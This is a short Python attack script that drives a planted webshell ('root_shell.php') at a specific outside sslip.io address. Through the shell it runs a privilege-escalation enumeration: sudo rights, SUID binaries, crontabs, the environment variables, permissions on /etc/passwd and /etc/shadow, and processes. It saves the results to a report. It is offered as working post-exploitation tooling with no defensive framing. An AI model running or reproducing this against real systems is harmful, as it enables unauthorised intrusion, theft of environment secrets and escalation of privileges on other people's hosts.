import requests
import sys

# Target webshell
SHELL_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io/root_shell.php"

def run_cmd(cmd):
    try:
        r = requests.get(SHELL_URL, params={'c': cmd}, timeout=20)
        return r.text.strip()
    except Exception as e:
        return f"Error: {e}"

def main():
    print("[*] Starting System Enumeration for Privilege Escalation...")
    
    tasks = {
        "User Info": "id",
        "OS Version": "cat /etc/os-release",
        "Kernel": "uname -a",
        "Sudo -l": "sudo -l -n 2>&1",
        "SUID Binaries": "find / -perm -u=s -type f 2>/dev/null | head -n 20",
        "Crontabs": "ls -la /etc/cron* /var/spool/cron/crontabs 2>/dev/null",
        "Network": "ss -tunlp",
        "Environment": "env",
        "Writable /etc": "ls -la /etc/passwd /etc/shadow 2>/dev/null",
        "Mounted Filesystems": "df -h",
        "Process List": "ps auxf | head -n 50"
    }
    
    report = []
    for name, cmd in tasks.items():
        print(f"[*] Checking {name}...")
        res = run_cmd(cmd)
        report.append(f"### {name}\n```\n{res}\n```\n")
        
    with open("privesc_enum.md", "w") as f:
        f.write("# Privilege Escalation Enumeration Report\n\n" + "\n".join(report))
        
    print("[+] Enumeration complete. Report saved to privesc_enum.md")

if __name__ == "__main__":
    main()
